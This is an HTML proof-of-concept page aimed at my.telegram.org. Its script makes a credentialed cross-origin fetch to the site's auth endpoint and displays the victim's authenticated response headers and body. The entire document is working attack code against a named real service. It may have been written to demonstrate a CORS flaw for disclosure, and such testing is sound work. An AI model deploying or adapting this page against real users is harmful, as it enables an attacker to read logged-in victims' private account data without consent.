<!doctype html>
<html>
<head><meta charset="utf-8"><title>CORS PoC — my.telegram.org</title></head>
<body>
  <h3>CORS Authenticated PoC — open DevTools (Network & Console)</h3>
  <pre id="out">running...</pre>
<script>
const ENDPOINT = 'https://my.telegram.org/auth';
fetch(ENDPOINT, { method:'GET', credentials:'include', mode:'cors' })
  .then(async r => {
    document.getElementById('out').innerText = 'Status: ' + r.status + '\n\nHeaders:\n' + Array.from(r.headers.entries()).map(h=>h.join(': ')).join('\n') + '\n\nBody preview:\n';
    try {
      const t = await r.text();
      document.getElementById('out').innerText += t.slice(0,2000);
      console.log('PoC body', t);
    } catch(e){
      document.getElementById('out').innerText += 'Error reading body: '+e;
    }
  })
  .catch(e => { document.getElementById('out').innerText = 'Fetch failed: ' + e; console.error(e); });
</script>
</body>
</html>
